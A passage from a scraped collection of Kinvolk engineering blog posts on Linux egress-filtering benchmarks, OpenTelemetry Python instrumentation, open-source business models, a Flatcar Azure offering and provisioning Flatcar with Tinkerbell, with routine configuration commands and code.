network.\nThe egress filtering is performed on the client machine and there is no filtering performed on the server\nside. Metrics An egress filter has to perform a matching operation to understand if a packet can continue its way or has to\nbe dropped. This operation could be costly if the number of blocked IPs is high. This kind of filter impacts\nthe throughput of IP connections, it consumes extra CPU and increases the latency. We decided to take into\nconsideration these metrics under the following conditions: Throughput CPU usage Latency Linux Filtering Mechanisms The Linux kernel provides different mechanisms to filter network packets. In this benchmark we considered the\nmost known ones. iptables is the historical and probably more known filtering utility in Linux. IP sets\nsupport high speed matching for sets of specific types, like IP ranges for instance. eBPF is very flexible and\ncustomizable. The following section provides more details of how we used those mechanisms in our benchmark. eBPF eBPF is a virtual machine built in the Linux kernel. In the networking scope, it allows the user to load\nprograms that are executed each time a packet arrives or is sent out of a networking interface. Those eBPF\nprograms can modify, redirect or drop the packets. There are different types of networking eBPF programs, CGROUP_SKB for per-cgroup filtering, SCHED_CLS and\nSCHED_ACT for filtering at the traffic control level, and XDP for filtering at the network interface level. In our scenario, we want to apply the same filtering regardless of the cgroup of the application generating\nthe traffic. The traffic coming from non-local applications or forwarded traffic should be filtered as well.\nThis makes filtering at the socket level unfit for our scenario. XDP programs can only be attached to the\ningress 1 path, removing it from consideration in our tests also. By process of elimination, we only\nconsider eBPF programs attached to the traffic control layer. Given that we want to keep the tests as simple as possible we decided to implement our\nown filtering\nprogram in eBPF that will be attached to the traffic control layer with a clsact qdisc. The clsact qdisc was\nintroduced in Linux 4.5, it’s a pseudo qdisc that allows to attach eBPF programs in ingress and egress using\nthe direct-action mode. Our filter implementation uses an LPM\nmap to save the list of IP addresses to block. eBPF implements the LPM algorithm with a digital\ntree . iptables We tested the standard iptables implementation by adding DROP rules to the OUTPUT chain in the filter table.\nThe rules we used have the following format -A OUTPUT -d 192.168.0.0/16 -o eth0 -m comment --comment \"benchmark\" -j DROP While implementing this filter we found that appending each rule independently was too slow and we had to use\nthe iptables-restore utility to do it. iptables uses a linear search algorithm for rule matching. IP Sets We also performed the testing with the IP sets framework. We used an IP set of\ntype hash:net and linked it to iptables by using the\nfollowing rule: -A OUTPUT -o eth0 -m set --match-set myset dst -m comment --comment benchmark -j DROP . The IP address to check is hashed and the result of the hash is used as the index in a hash table. Each bucket\nof the hash table contains an array of networks for that hash. When an IP address is checked against an IP set\nof type “hash:net”, it is not known what network size will match. The IP set implementation hashes the IP\naddress for all possible network sizes. For instance, if the IP to match is 1.2.3.4, it looks for 1.2.3.4/32,\nfor 1.2.3.4/31 and so on until all the 32 possible network sizes have been tested. Benchmark Set-up We used iperf3 to measure the performance of TCP, UDP and the CPU usage. The standard ping utility was\nused to measure the latency. We tested with 10, 100, 1k, 10k, 100k and 1M rules and each test was run 5 times\nto get statistical robustness. We used two bare metal servers - running on Packet - as client and server machines.\nThe specifications of such servers are: c2.medium.x86\n1x AMD EPYC 7401P 24-Core Processor @ 2.0GHz\n2x 120GB SSD\n2x 480GB SSD\n64GB RAM\n2x 10Gbps The exact versions of the tools we used are: Flatcar Container Linux by Kinvolk alpha\n( 2705.0.0 ) Linux kernel 5.9.11 iperf 3.6 (in a Docker container with the host network) iptables v1.6.2 ipset v7.6, protocol version: 7 Reproducibility https://github.com/kinvolk/egress-filtering-benchmark has all the tools and instructions to reproduce these tests. Results Test #1 - TCP Throughput The throughput graph shows that the test is reaching line rate, 10Gbps because we are using a single\nconnection hence only one of the interfaces on the bonding is used in most of the cases. Only iptables with\nmore than 10k rules is not able to handle that performance. From this test we can conclude that iptables\ndoesn’t scale well after 100k, but unfortunately we cannot conclude anything from other tests as network\nperformance is the bottleneck. In order to stress the CPU more, we performed another test using UDP. Test #2 - UDP Throughput The goal of this test is to saturate the CPU. We used UDP packets with a size of 1470 bytes and the -b 10G parameter to try to reach line rate. The graph shows that none of the cases reaches the 10Gbps line rate, it’s\ngood for this test because it means the network is not the bottleneck anymore. We can see that iptables does not scale well beyond 1k rules and that IP sets give a slightly higher\nthroughput than eBPF on the clsact qdisc for high number of rules. Test #3 - CPU usage We used iperf with a target bandwidth of 1Gbps ( -b 1G ) to avoid saturating the CPU and be able to compare\nthe CPU usage with the different filters. We take the CPU usage reported by iperf that includes all the\napplications running on the host. From the above graph we can see that the CPU usage with iptables increases\nwhen using more than 1k rules. The CPU usage with eBPF and IP sets filters stays just about equal and almost\nconstant despite the increasing number of rules. Test #4 - Latency We used the standard Linux ping utility to measure the latency with the -i 0.001 and -c 1000 parameters,\nsending 1000 pings at a 1 millisecond interval. The above graph shows that the latency is not affected by the\nnumber of rules in the eBPF and IP sets filters, it’s ~27µs in those cases. On the other hand, it increases\nlinearly with the number of rules for the iptables case. Test #5 - Setup Time This test aims to measure the time it takes to install the filtering rules on the system. It doesn’t take into\nconsideration fixed times like loading the eBPF program, creating the IP sets but instead focuses on measuring\nthe time it takes to update the rules themselves and how it changes with the number of rules. The above graph shows that the time required to set up the rules in all the filters increases linearly with\nthe number of rules. With 100.000 IPs, the setup time is still less than one second. For 1 million IPs, the setup time is less than\n10 seconds. This shows that in practice, all 3 methods have an acceptable setup time. The setup time is very dependent on the benchmark implementation rather than being inherent to the filtering\nmethod. Each filtering method could be optimised in the benchmark code if it were deemed necessary. For the bpf filter: the benchmark performs one bpf() system call for every IP. From Linux 5.6, it is\npossible to perform several updates in a eBPF map with a single bpf()\ncall . For the iptables and IP sets filters, the benchmark executes external commands and feeds each IP range\nindividually over a pipe. We could avoid that by communicating the list to the kernel using the Netlink\nprotocol directly. There are some\nattempts to implement IP Sets support in\nGolang with the vishvananda/netlink library. For this reason, the reader should be cautious before comparing the setup time of one filter to another. This\nshould not be interpreted as one method being better than another but rather to show expected setup\nperformance and that setup time is unlikely to be a problem for any filtering method. Test #6 - Throughput with too Many Rules The throughput in the tests one and two is almost the same regardless of the number of rules for the eBPF and\nIP Sets filters. We wanted to know if this behaviour changed with a higher number rules, i.e., up to 100\nmillions. We found that it’s not possible to run a test with 100M entries in the eBPF case as this would require more\nthan 4GB of memory for the LPM map and it’s not allowed\nby the Linux kernel 2 . We decided to\ntest with 10M and 50M rules. From the above chart we can see that the difference in throughput between IP sets and eBPF is almost\nnegligible even with 10M and 50M rules. Profiling the CPU usage If you want to understand more about each implementation and read the relevant source code, a good way to get\nstarted is to profile the CPU usage to find out which functions take most of the CPU time. In the UDP tests, the CPU is saturated and is not able to reach the 10Gbps line rate. We can use the BCC profile tool to get the list of\nfunctions that are executed in the tests for each filtering method. We have to run the tool with the -K parameter to get the traces from the kernel. sudo /usr/share/bcc/tools/profile -K Iptables For the iptables case, it prints the following trace: ipt_do_table\nipt_do_table\nnf_hook_slow\n__ip_local_out\nip_local_out\n__ip_queue_xmit\n__tcp_transmit_skb The order of calls is from the bottom to the top, we can see how the nf_hook_slow function calls ipt_do_table in an\niterative manner. It is a simple “for” loop that iterates over each rule, explaining the performance\ndecreasing linearly with the amount of rules. eBPF We got the following trace for the eBPF case: longest_prefix_match.isra.0\nlongest_prefix_match.isra.0\ntrie_lookup_elem\ncleanup_module\ncleanup_module\ntcf_classify\n__dev_queue_xmit\nip_finish_output2\nip_output In this case the first important call is to tcf_classify and the lookup in the\nLPM is performed in trie_lookup_elem and longest_prefix_match . It is\nwalking the trie . This explains the better performance, since walking\nover the trie takes maximum 32 steps with IPv4 addresses. Without eBPF JIT enabled we would have expected to see __bpf_prog_run and __bpf_prog_run32 just before the trie_lookup_elem . These calls interpret the eBPF program instructions and convert into eBPF bytecode. The\nnon-presence of these calls shows that eBPF JIT compiler is in effect. IP Sets The traces for IP sets are the following: hash_net4_test\nhash_net4_test\nhash_net4_kadt\nip_set_test\nset_match_v4\nipt_do_table\niptable_filter_hook\nnf_hook_slow\n__ip_local_out\nip_local_out\nip_send_sk\nudp_send_skb.isra.0\nudp_sendmsg For the IP sets case we can see how the first part of the stack is the same as iptables, nf_hook_slow ->\niptable_filter_hook-> ipt_do_table. Then set_match_v4 and after it specific\nIP set logic is executed: ip_set_test , hash_net4_kadt and hash_net4_test , that\nlookups all possible network sizes for a given IP. Conclusion The throughput, CPU usage and latency tests show that IP sets and eBPF filters scale well even with 1 million\nIPs. On the other hand, iptables doesn’t scale that well and even with a low number of rules like 1k or 10k\nshows a considerable difference to the other filters. This is expected as iptables performs a linear search on\nthe rule list. IP sets fared marginally better than eBPF with an LPM map on a clsact qdisc, it has a slightly higher\nthroughput in the UDP test and uses less CPU. We suspect this is because the random CIDR’s generated in the\nbenchmark test were with the subnet mask /24 and /16 , this resulted in faster lookups on the hash table.\nThe lookup time grows linearly with the number of different prefix values added to the set. Hence we cannot\ncompare the performance between IP sets and eBPF in the general case at this point. After enabling the eBPF JIT compiler, eBPF managed to bridge the performance gap versus IP sets, being more\nnoticable in nearly equal CPU usage and throughput when the number of rules reached upto 50M. eBPF cannot handle more than ~89M entries due to restrictions in the Linux kernel. We suggest the decision of what tool to use shouldn’t be strictly based on the results of this benchmark but\nshould take into consideration other aspects like whether the technology is already used on the hosts, whether\nthere are other needed features (now or in the future) that could be provided by some of the technologies, the\nway traffic statistics can be exposed to a monitoring tool, etc. Keep in mind that this benchmark only tests a specific use case: filtering a large deny-list of IP address\nranges on egress. A more realistic cluster would have other filters, including on ingress. Notes There are some proposals to add support for the egress path but they\naren’t merged at the time of writing. ↩︎ Each element on the LPM map requires 48 bytes in our case\n(40 from sizeof(struct lpm_trie_node) + 4 from attr->value_size and 4 from trie->data_size ). It\nmeans the maximum number of possible elements in the map is (2^32/48) ~89M. ↩︎", "date": "2020-09-10"},
{"website": "Kinvolk", "title": "OpenTelemetry Python Implementation Deep Dive", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Mauricio Vásquez\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/06/opentelemetry-python-implementation-deep-dive/", "abstract": "OpenTelemetry is a set of libraries, agents and other components that enable the generation and collection of telemetry data. Applications and libraries use the OpenTelemetry API to record information (telemetry) about the different performed operations. The telemetry data usually includes the start and end times, attributes for the operation (headers in an http request for instance), type of operation, result, etc. Our previous A Shallow Dive Into Distributed Tracing blog-post presents a nice introduction to distributed tracing and OpenTelemetry. This blog post shows the different techniques used to implement instrumentation libraries in Python. It’s intended for developers that are curious about the internal details of OpenTelemetry as well as for new OpenTelemetry contributors who want to get a general idea without having to dig too deeply into the code. It’s not intended for end users. A better place for them to start is reading the official OpenTelemetry Python documentation . This blog post is specific to OpenTelemetry Python (the language I worked in), the solutions implemented in the different languages could be quite different due to the intrinsic characteristics of each language. Tracing information is generated by the application itself and third party libraries. A dream goal of OpenTelemetry would be to have all libraries use the OpenTelemetry API (built-in support). At the time of writing this blog post there is not any known Python third party library with built-in support for OpenTelemetry, however, some library developers are starting to show some interest in providing it. We are aware that many libraries will not include built-in support. In those cases, a separate instrumentation library wraps the third party library (instrumented library) and makes the calls to the OpenTelemetry API. OpenTelemetry Python Instrumentation Libraries OpenTelemetry Python provides instrumentation libraries (also called integrations) for some of the most popular third party libraries. A developer can import and enable the generation of telemetry data without worrying about how it’s implemented. Instrumentation libraries are shipped as independent Python packages. Those integrations provide an Instrumentor class that defines the instrument() and uninstrument() methods that enable/disable the telemetry data generation. In order to enable the integration, an application developer should call the instrument() method before performing any operation with the library. The following is a code snippet of a complete example . import requests from opentelemetry.ext.requests import RequestsInstrumentor # TODO: configure exporters # Enable instrumentation in the requests library RequestsInstrumentor() . instrument() # This call will generate telemetry data response = requests . get(url = \"https://kinvolk.io/\" ) This approach is intended for application developers that are already using OpenTelemetry in their applications and want to enable tracing reporting on the third libraries they are using. Let’s see how it’s implemented under the hook. An instrumentation library intercepts the internal calls of the instrumented library and invokes the OpenTelemetry API to generate telemetry data about the ongoing operation. There are two ways to intercept the internal instrumented library calls in Python, the first one is to use a hook mechanism provided by some libraries, the second one is to use monkey patching to modify the runtime behaviour of the library without changing the code. Hook Mechanisms Some libraries provide a hook mechanism that allows a developer to register a set of callbacks that are invoked by the library when it performs some operations. In some cases the information about the ongoing operation is passed as argument to the callbacks, in other cases it has to be accessed through a specific API provided by the library. An example of this kind of integration is Flask . This library provides the before_request and the tear_down_request hooks. The OpenTelemetry Python Flask integration registers two callbacks that record the telemetry data. The _before_request callback attaches the incoming distributed context, records the attributes of the incoming HTTP request, starts a span and saves it to be used in the _teardown_request callback. def _before_request (): # Get access to the context of this request environ = flask . request . environ # Attach (enable) distributed tracing context if any # This operation is only meaningful in server libraries token = context . attach(\n        propagators . extract(otel_wsgi . get_header_from_environ, environ)\n    ) # Helper function to collect the attributes from an HTTP request attributes = otel_wsgi . collect_request_attributes(environ)\n\n    span_name = flask . request . endpoint or otel_wsgi . get_default_span_name(\n        environ\n    ) # Start and activate a span indicating the HTTP request operation handling # in the server starts here span = tracer . start_span(\n        span_name,\n        kind = trace . SpanKind . SERVER,\n        attributes = attributes,\n        start_time = environ . get(_ENVIRON_STARTTIME_KEY),\n    )\n    activation = tracer . use_span(span, end_on_exit = True)\n    activation . __enter__() # Use this request context to save these objects until the operation # completes environ[_ENVIRON_ACTIVATION_KEY] = activation\n    environ[_ENVIRON_SPAN_KEY] = span\n    environ[_ENVIRON_TOKEN] = token The _teardown_request callback finishes the span started above and detaches the distributed context. def _teardown_request (exc):\n    activation = flask . request . environ . get(_ENVIRON_ACTIVATION_KEY) # Finish the span indicating the handling of the operation is completed if exc is None:\n        activation . __exit__(None, None, None) else :\n        activation . __exit__( type (exc), exc, getattr (exc, \"__traceback__\" , None)\n        ) # Detach the distributed context context . detach(flask . request . environ . get(_ENVIRON_TOKEN)) Those callbacks are registered in the internal _InstrumentedFlask class. class _InstrumentedFlask (flask . Flask): def __init__(self, * args, ** kwargs): super () . __init__( * args, ** kwargs)\n\n        self . _original_wsgi_ = self . wsgi_app\n        self . wsgi_app = _rewrapped_app(self . wsgi_app)\n\n        self . before_request(_before_request)\n        self . teardown_request(_teardown_request) Finally, the instrument method overwrites the flask.Flask class to _InstrumentedFlask , hence Flask apps created by the user are instrumented. class FlaskInstrumentor (BaseInstrumentor): def _instrument (self, ** kwargs):\n        self . _original_flask = flask . Flask\n        flask . Flask = _InstrumentedFlask def _uninstrument (self, ** kwargs):\n        flask . Flask = self . _original_flask Other examples of integrations using library specific hooks are pymongo , grpc and aiohttp The hooks approach should be preferred when it’s available as it avoids relying on internal implementation details of the instrumented library. A possible drawback of this is that all the wanted information iscould not be available in the hook API provided by the library. Monkey Patching Unfortunately, hooks are not available in all cases; they could not be provided at all or the provided ones could be not enough for the instrumentation library to do its work. Fortunately, Python is such a flexible language and monkey patching can be used to intercept the instrumented library calls to invoke custom callbacks defined in the instrumentation library. The most frequently used technique is to define some wrap callbacks that intercept the instrumented library calls to gather the tracing information. One example of such an integration is requests . The requests.send() function is wrapped, i.e., each time the user calls this function, a defined wrapper is called. It records all the tracing information and then invokes the original requests.send() method. def _instrument (tracer_provider = None):\n    wrapped = Session . request # Define the callback that will record the tracing information @functools.wraps (wrapped) def instrumented_request (self, method, url, * args, ** kwargs): with tracer . start_as_current_span(path, kind = SpanKind . CLIENT) as span: # Record some attributes before performing the request span . set_attribute( \"component\" , \"http\" )\n            span . set_attribute( \"http.method\" , method . upper())\n            span . set_attribute( \"http.url\" , url) # Propagate distributed context headers = kwargs . setdefault( \"headers\" , {})\n            propagators . inject( type (headers) . __setitem__, headers) # Call original requests.send() function result = wrapped(self, method, url, * args, ** kwargs) # Collect some other attributes after performing the request span . set_attribute( \"http.status_code\" , result . status_code)\n            span . set_attribute( \"http.status_text\" , result . reason)\n            span . set_status(\n                Status(_http_status_to_canonical_code(result . status_code))\n            ) return result # Monkey patch Session.request to be instrumented_request Session . request = instrumented_request Other examples of this kind of integration are redis , db-api and sqlalchemy . The biggest drawback of this method is that it relies on internal details of the library, an internal change in the library could break the integration at any time. Auto-instrumentation Auto-instrumentation is a mechanism that allows you to get traces from applications that don’t have any instrumentation. Yes, you read it correctly! The Python Auto-instrumentation with OpenTelemetry blog post presents it with a nice example. The opentelemetry-auto-instrumentation command automatically detects the installed instrumented libraries and enables them. The following command will produce tracing information if myapplication.py uses any library that has an instrumentation library installed on the system. $ opentelemetry-auto-instrumentation python myapplication.py The idea behind auto-instrumentation is to use the instrumentation libraries described above to make the third party libraries emit tracing information without the user changing the code of the application, i.e., enabling the instrumentation libraries automatically. The problem can be divided in two: (1) how can we detect all the installed instrumentation libraries and (2) how can we execute arbitrary code (invoke instrument() in the different instrumentation libraries) before the user application is run? The first problem is solved using entry points , a mechanism to expose a callable object to other code in Python. In the OpenTelemetry Python context, the instrumentation libraries expose the opentelemetry_instrumentor so it can be invoked from other components. # snippet from setup.cfg\nopentelemetry_instrumentor =\n    requests = opentelemetry.ext.requests:RequestsInstrumentor For the second problem, Python provides the module site that is automatically imported during initialization and allows us to perform\narbitrary specific customizations by importing a sitecustomize module. OpenTelemetry Python defines its own sitecustomize module that calls instrument() in all the installed\nintegrations by looking for all the opentelemetry_instrumentor entry points\navailable. for entry_point in iter_entry_points( \"opentelemetry_instrumentor\" ): try :\n        entry_point . load()() . instrument() # type: ignore logger . debug( \"Instrumented %s \" , entry_point . name) except Exception : # pylint: disable=broad-except logger . exception( \"Instrumenting of %s failed\" , entry_point . name) The opentelemetry-auto-instrumentation command just prepends the OpenTelemetry Python sitecustomize module path to PYTHONPATH to make sure it’s executed before the application. What’s next? The auto-instrumentation mechanism currently only enables the instrumentation in the different libraries but doesn’t perform any configuration on the span exporters. Strictly speaking it’s not currently possible to use auto-instrumentation without touching the code because it does not export any trace. The OpenTelemetry team is aware of this and there is an issue tracking the effort aimed at solving this limitation. Once the team agrees in a configuration format (env variables, configuration file, etc.), the implementation should be straightforward, the sitecustomize module already used could do all the span exporters initialization that is needed. The integration of auto-instrumentation and technologies like Kubernetes could open the door to new amazing possibilities. For instance, a user could enable the trace reporting in a containerized Python application by writing a ConfigMap or some env variables in the application’s manifest. This could be taken a step further in Lokomotive Kubernetes , pieces like exporters, collectors, etc. needed to have a complete tracing and monitoring infrastructure could be a Lokomotive component . It could be even possible to enable the applications to report traces without almost any user intervention. We really enjoyed contributing to the OpenTelemetry project and we are looking forward to integrating its amazing features to our products.", "date": "2020-06-18"},
{"website": "Kinvolk", "title": "Let's talk about the Business of Open Source", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andy Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/09/lets-talk-about-the-business-of-open-source/", "abstract": "Let’s face it, in the open source community, the topic of commercialization is\noften best avoided. Given a choice, many technology enthusiasts would rather\nsidestep talking about the dirty business of making money from free software. We at Kinvolk have never shied away from the fact that in order to be able to\ninvest in innovative open source software, we have to make money. However, we\nare equally clear that we believe in the foundational\nprinciples of free software.\nUnlike those who pursue the “ open\ncore ”\nmodel of keeping their most desirable features in proprietary “enterprise”\nversions, we believe that critical infrastructure software should always be\n100% open source. Frankly, this is the direction the industry is headed, and\nthose pursuing proprietary software business models risk being squeezed out by\nopen source solutions. This leads to the obvious question: If you give away the software, how do you\nmake money? At Kinvolk, we balance revenue streams from a number of sources: engineering\nand security consulting (through our Kinvolk Labs team), software subscriptions, and professional services helping end users\nadopt our technologies. The traditional venture capital response to this model\nis horror: a services business! It’s not scalable! What do VCs mean when they say that a business is “scalable”? Basically, that\nproduct sales can grow rapidly without needing to add headcount. The argument that businesses shouldn’t pursue 100% open source model because it\ndoesn’t scale has four major flaws: First, it ignores that most traditional proprietary software businesses\nalso have significant people-driven limitations on scaling . Particularly in\ncomplex enterprise software, many sales typically require a lot of\nprofessional services. Also, sales/marketing costs are often a high\nproportion of revenue, and many businesses struggle to ever realize the\npromised benefits of scale in terms of reduced customer acquisition cost. Second, it ignores that an open source development approach can actually increase project velocity , both in terms of adoption and collaboration\nwith partners, significantly improving scalability of engineering and\nbusiness development efforts. Third, it ignores that many of the “services” products that we and others\noffer around our open source projects are in fact highly scalable . For\nexample, a 24x7 helpdesk with response time guarantees, software supply chain\nguarantees (directly delivered signed binaries rather than downloading from\ncommunity servers), or a security monitoring/alert service, can all be\nprovided with relatively linear resources. Fourth, it ignores that for many founders, creating a highly scaled, maximally\nprofitable business may not be their sole objective. Rather, they might\nprefer to pursue a multi-stakeholder view of business that values the\ncreation of open source software and building genuine community as a\nworthwhile end in itself . Since it was founded in 2015, Kinvolk has been profitable every year. Last\nyear, we grew revenues by more than 35%, and doubled our team size in response\nto the opportunities in front of us. We are proud to stand alongside industry\nleaders – such as Red Hat ( $3.4bn\nrevenue ),\nCanonical ( 10% profit margin on $110m\nrevenue ), and\nRancher ( reportedly acquired for >$600\nmillion )\n– who are proving that a 100% open source business can not just be viable, but\nalso be at the forefront of technology and community building. The topic of commercial open source has far-reaching impacts for anyone\ndeveloping, investing in, or consuming the technology. At Kinvolk, we want to\nhelp shape this conversation. This is why we are collaborating with GitPod,\nKubermatic, Balderton Capital and SAP to create O4B: the Open Source Business\nForum . Initially a virtual event, but hopefully in time an\nin-person one as well, O4B will examine these questions from a specifically\nEuropean perspective. We’d love for you to be part of the ongoing conversation!", "date": "2020-09-29"},
{"website": "Kinvolk", "title": "Announcing Flatcar Container Linux Pro for Microsoft Azure", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andy Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/10/announcing-flatcar-container-linux-pro-for-microsoft-azure/", "abstract": "With the success of Flatcar Container Linux on Microsoft Azure Marketplace, we’ve seen hundreds of millions of usage hours since it was made available just a few months ago. Today, we are announcing Kinvolk’s new offering called Flatcar Container Linux Pro for Azure . Available in the Azure Marketplace , the Pro edition of Flatcar Container Linux is the result of a close collaboration with our friends in the Azure compute team, and includes: Direct access to the Flatcar engineering team, with 24x7 access to the Kinvolk customer portal and our SLA-backed support for rapid response to any production issues, or just technical questions. An Azure-tuned kernel (initially based on the 5.4 Linux release), with all the configuration options, patches and modules required for optimized performance on Azure, as specified by the Microsoft Azure Linux team. Support for Azure Accelerated Networking, thanks to included single root I/O virtualization (SR-IOV). “In collaboration with Kinvolk, we’re continuing to help our customers run optimized Linux experiences on Azure,” said Arpan Shah,\nGeneral Manager, Microsoft Azure. “With the new Flatcar Container Linux, based on the Azure Tuned\nKernel specification, we’re helping customers smoothly transition from CoreOS to Flatcar\nwith enterprise support.” Flatcar Container Linux Pro will continue to be enhanced with tighter Azure integration, including the following features planned in the coming months: Built-in drivers for all Azure GPU-enabled instances, enabling access to accelerated graphics hardware for workloads such as machine learning. HyperV telemetry, enabling reporting of boot-time and other issues through the hypervisor for ease of troubleshooting and support. Optional setting to enable federal information processing standards (FIPS) encryption modules, that may be required for compliance in some environments. Beyond this initial release for Azure, we plan to also release Flatcar Container Linux Pro optimized for a variety of cloud platforms. If you are interested in support for a specific platform, please let us know . Flatcar Container Linux Pro is available today in all Azure global regions, and is billed through your existing Azure account on a metered basis. Pricing is based on instance type. Try it today on Azure Marketplace .", "date": "2020-10-21"},
{"website": "Kinvolk", "title": "Provisioning Flatcar Container Linux with Tinkerbell", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Iago López Galeiras\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/10/provisioning-flatcar-container-linux-with-tinkerbell/", "abstract": "While much of the world’s computing has moved to virtual machines running in\nthe cloud, there are still many reasons why users want to deploy their\nworkloads on bare metal servers. But provisioning and managing physical servers\nhas historically been a manual and resource-intensive process. It doesn’t have to be that way, though - once an oxymoron, the concept of “bare\nmetal cloud” has been made possible by technologies for booting from the\nnetwork, together with API-driven control planes for managing server and\nnetwork configurations. For some time, Equinix Metal (previously known as\nPacket) has been an innovator in the “bare metal cloud” space, and so we were\nexcited when they open sourced their control\nplane . This new\nproject, Tinkerbell , includes four major components: boots : a DHCP and iPXE server tink : a workflow engine OSIE : an in-memory operating system hegel : a metadata service Combining these components together enables the automated bringing up of bare\nmetal machines over a variety of platforms. Of course, as Flatcar Container Linux is our\npreferred operating system for deploying container workloads, we wanted to see\nhow easy it would be to use Tinkerbell to deploy Flatcar. The answer is that,\nwith a few tweaks that we have now upstreamed into Tinkerbell, it is quite\nstraightforward. In this blog post, we’ll walk through the steps to provision Flatcar Container\nLinux on bare metal machines using Tinkerbell. We also filed a pull\nrequest to add a\nworkflow example for Flatcar Container Linux to the Tinkerbell documentation. To ease reproducibility, we’ll use a local Vagrant setup that simulates a\nsimple bare-metal setup. Instructions We’ll use Vagrant to deploy a provisioner and a worker machine. The\nprovisioner will run the Tinkerbell stack and the worker will be provisioned\nwith Flatcar Container Linux using Tinkerbell. We’ll assume VirtualBox is the provider used for Vagrant. Create VMs First, we download, extract and enter v0.1.0 of the Tinkerbell sandbox repository. wget https://github.com/tinkerbell/sandbox/archive/v0.1.0.tar.gz\ntar xf v0.1.0.tar.gz cd sandbox-0.1.0 Now we go into the Vagrant directory and run Vagrant to set up the Provisioner. cd deploy/vagrant\n\nvagrant up --provider virtualbox provisioner When the provisioner is ready, you’ll see the following message: INFO: tinkerbell stack setup completed successfully on ubuntu server Start Tinkerbell SSH into the provisioner. vagrant ssh provisioner Bring up the Tinkerbell stack. cd /vagrant && source .env && cd deploy\ndocker-compose up -d Check all containers are up. docker-compose ps Create Flatcar Container Linux configuration Tinkerbell uses containers to run the different actions needed for\nprovisioning. For example, there can be one container to wipe the disk, one to\npartition the disk and another to install the root filesystem. To install Flatcar Container Linux we only need one container that runs the\nofficial flatcar-install script. We’ll push the Flatcar Container Linux\ninstaller container image to the Tinkerbell Docker registry. Let’s create our installer Docker image for Flatcar Container Linux and push\nit.\nThis image includes the flatcar-install script to install Flatcar Container Linux to disk. In the provisioner console: TINKERBELL_HOST_IP = 192.168.1.1 # This is the default so it doesn't need changing. cat << EOF > Dockerfile FROM ubuntu RUN apt update && apt install -y udev gpg wget RUN wget https://raw.githubusercontent.com/flatcar-linux/init/flatcar-master/bin/flatcar-install -O /usr/local/bin/flatcar-install && \\ chmod +x /usr/local/bin/flatcar-install EOF docker build -t $TINKERBELL_HOST_IP /flatcar-install .\ndocker push $TINKERBELL_HOST_IP /flatcar-install Flatcar Container Linux uses a mechanism called Ignition to\nprovision machines on the first boot. To be able to SSH into the worker\nmachine, we need an Ignition config that adds our SSH public key to the\nauthorized keys of the machine. For simplicity, we generate a new SSH key on the provisioner and add that to\nthe Ignition configuration. ssh-keygen -f /home/vagrant/.ssh/id_rsa -N \"\" Usually, we’ll write a Container Linux config and then use the Container\nLinux Config\nTranspiler to\nconvert it to a JSON Ignition config. In this case we’re writing the Ignition\nconfig directly to avoid pulling in extra dependencies. We write a minimal config and encode it in Base64, saving its value to a\nvariable. SSH_KEY = \" $( cat ~/.ssh/id_rsa.pub ) \" IGNITION_CONFIG = $( cat << EOF | base64 -w0; echo { \"ignition\" : { \"config\" : {}, \"timeouts\" : {}, \"version\" : \"2.1.0\" }, \"networkd\" : {}, \"passwd\" : { \"users\" : [ { \"name\" : \"core\", \"sshAuthorizedKeys\" : [ \"$SSH_KEY\" ] } ] }, \"storage\" : {}, \"systemd\" : {} } EOF ) Set up internet access for worker The Flatcar Container Linux installer needs access to the internet to download\nthe latest image, so we’ll use the provisioner as a NAT gateway for the worker\nusing iptables. sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nsudo iptables -A FORWARD -i eth1 -j ACCEPT\nsudo iptables -A FORWARD -i eth0 -j ACCEPT Create Tinkerbell workflow for Flatcar Container Linux We now create a file named hardware-data.json with the hardware data for our\nworker. For this example we’ll use a hardcoded ID for the hardware data entry and the\nMAC is hardcoded in the Vagrant file. ID = \"ce2e62ed-826f-4485-a39f-a82bb74338e2\" MAC = \"08:00:27:00:00:01\" cat << EOF > hardware-data.json { \"id\": \"$ID\", \"metadata\": { \"facility\": { \"facility_code\": \"onprem\" }, \"instance\": {}, \"state\": \"\" }, \"network\": { \"interfaces\": [ { \"dhcp\": { \"arch\": \"x86_64\", \"ip\": { \"address\": \"192.168.1.5\", \"gateway\": \"192.168.1.1\", \"netmask\": \"255.255.255.248\" }, \"mac\": \"$MAC\", \"uefi\": false }, \"netboot\": { \"allow_pxe\": true, \"allow_workflow\": true } } ] } } EOF We’ll push the hardware data into the Tinkerbell database. docker exec -i deploy_tink-cli_1 tink hardware push < ./hardware-data.json Now we need to create a template for Flatcar Container Linux.\nWe’ll use the Ignition configuration we generated earlier. cat << EOF > ./flatcar-template.yaml.tmpl version: '0.1' name: flatcar-install global_timeout: 1800 tasks: - name: \"flatcar-install\" worker: \"{{.machine1}}\" volumes: - /dev:/dev            # Needed for accessing the disk so that we can install Flatcar on it. - /statedir:/statedir  # Needed for passing the Ignition config JSON and running flatcar-install. actions: - name: \"dump-ignition\" image: flatcar-install command: - sh - -c - echo '$IGNITION_CONFIG' | base64 -d > /statedir/ignition.json # Decode Ignition config to a file. - name: \"flatcar-install\" image: flatcar-install command: - /usr/local/bin/flatcar-install - -s    # Install to smallest disk. - -i - /statedir/ignition.json EOF The next step is creating the Tinkerbell template. docker exec -i deploy_tink-cli_1 tink template create --name flatcar-install < ./flatcar-template.yaml.tmpl Note the resulting ID and use it to create a workflow for the worker. A\nworkflow is an instantiation of a template that applies to one machine. To\nselect the worker in our workflow, we need its MAC address again. TEMPLATE_ID = \"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\" docker exec -i deploy_tink-cli_1 tink workflow create -t $TEMPLATE_ID -r \"{\\\"machine1\\\": \\\" $MAC \\\"}\" Note the resulting workflow ID. Start the Worker Open a new terminal window and start the worker. cd sandbox/deploy/vagrant\n\nvagrant up --provider virtualbox worker Note : This command will never exit successfully, we’re using it only to\nstart the worker and we’ll be doing manual VirtualBox operations to continue\nthe process. The worker will boot up OSIE and then the workflow will run. We can see the boot up process through the VirtualBox UI and, on the\nprovisioner, we 